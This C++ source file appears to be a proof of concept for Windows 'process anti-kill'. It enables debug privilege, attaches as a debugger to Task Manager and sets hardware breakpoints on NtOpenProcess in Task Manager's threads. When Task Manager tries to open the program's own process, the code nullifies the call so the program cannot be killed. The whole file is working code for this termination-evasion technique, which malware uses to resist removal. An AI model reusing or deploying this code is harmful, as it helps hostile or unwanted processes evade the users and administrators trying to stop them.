// process anti-kill [ring3], based on DRx debug hook
// 
// $ set PATH=C:\MinGW\mingw64\bin; && C:\windows\system32\taskmgr; 
// $ g++ -m64 drnHook.cpp && a.exe
// 
// by aaaddress1@chroot.org

#include <windows.h>
#include <iostream>
#include <tlhelp32.h>

bool EnablePrivilege(HANDLE   hToken, LPCTSTR   szPrivName, BOOL   fEnable) {
	TOKEN_PRIVILEGES   tp;
	tp.PrivilegeCount = 1;
	LookupPrivilegeValue(NULL, szPrivName, &tp.Privileges[0].Luid);
	tp.Privileges[0].Attributes = fEnable ? SE_PRIVILEGE_ENABLED : 0;
	AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
	return((GetLastError() == ERROR_SUCCESS));
}

DWORD taskmgrProcId() {
	static DWORD pid = -1;
	if (pid == -1) {
		GetWindowThreadProcessId(FindWindowA("TaskManagerWindow", NULL), &pid);
		printf("[+] selected target process id = %x\n", pid);
	}
	return pid;
}

size_t readDword64(LPVOID addr) {
	size_t v;
	HANDLE op = OpenProcess(PROCESS_ALL_ACCESS, false, taskmgrProcId());
	ReadProcessMemory(op, addr, &v, sizeof(size_t), 0);
	return v;
}


HANDLE taskmgrHandle() {
	return OpenProcess(PROCESS_ALL_ACCESS, false, taskmgrProcId());
}

void hook(DWORD dwThreadId, size_t addr)
{
	CONTEXT Context;
	HANDLE hThread;
	Context.ContextFlags = CONTEXT_FULL | CONTEXT_DEBUG_REGISTERS;
	hThread = OpenThread(THREAD_ALL_ACCESS, false, dwThreadId);
	GetThreadContext(hThread, &Context);

	Context.Dr0 = addr;
	Context.Dr7 &= 0;
	if (Context.Dr0)
		Context.Dr7 = Context.Dr7 | 3;
	if (Context.Dr1)
		Context.Dr7 = Context.Dr7 | 12;
	if (Context.Dr2)
		Context.Dr7 = Context.Dr7 | 48;
	if (Context.Dr3)
		Context.Dr7 = Context.Dr7 | 192;

	Context.ContextFlags = CONTEXT_FULL | CONTEXT_DEBUG_REGISTERS;
	SetThreadContext(hThread, &Context);
	CloseHandle(hThread);
}

void setHarwareException(size_t addr) {
	HANDLE h = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (h == INVALID_HANDLE_VALUE) return;
	THREADENTRY32 te;
	te.dwSize = sizeof(te);
	if (!Thread32First(h, &te)) return;
	do {
		if (te.th32OwnerProcessID == taskmgrProcId()) {
			hook(te.th32ThreadID, addr);
		}
		te.dwSize = sizeof(te);
	} while (Thread32Next(h, &te));
	CloseHandle(h);
}

int main(void) {
	HANDLE hToken = NULL;
	if (0 != OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
		EnablePrivilege(hToken, SE_DEBUG_NAME, true); //SE_DEBUG
	}
	else return 0;

	printf("[+] current process id = %x\n", GetCurrentProcessId());
	DebugActiveProcess(taskmgrProcId());

	long NextAction = DBG_EXCEPTION_NOT_HANDLED;
	CONTEXT ct = { 0 };
	DEBUG_EVENT debugEvent;
	size_t addrNtOpenProc = (size_t)GetProcAddress(LoadLibraryA("ntdll"), "NtOpenProcess");
	printf("[+] ntdll!ZwOpenProcess @ %p\n", addrNtOpenProc);
	setHarwareException(addrNtOpenProc);

	while (true) {
		WaitForDebugEvent(&debugEvent, INFINITE);
		NextAction = DBG_EXCEPTION_NOT_HANDLED;
		if (debugEvent.dwDebugEventCode == EXCEPTION_DEBUG_EVENT) {

			void* hThread = OpenThread(THREAD_ALL_ACCESS, false, debugEvent.dwThreadId);
			SuspendThread(hThread);
			ct.ContextFlags = CONTEXT_FULL | CONTEXT_DEBUG_REGISTERS;
			GetThreadContext(hThread, &ct);
			if ((size_t)debugEvent.u.Exception.ExceptionRecord.ExceptionAddress == addrNtOpenProc) {
				if (readDword64((LPVOID)ct.R9) == GetCurrentProcessId()) { // try to kill current process?
					ct.Rcx = 0;
					puts("[+] are you trying to kill me? >:(");
				}
				ct.R10 = ct.Rcx; // mov r10, rcx - 4c 8b d1
				ct.Rip += 3;
				SetThreadContext(hThread, &ct);
			}
			ResumeThread(hThread);
			NextAction = DBG_CONTINUE;
		}
		ContinueDebugEvent(debugEvent.dwProcessId, debugEvent.dwThreadId, NextAction);
	}
	return 0;
}
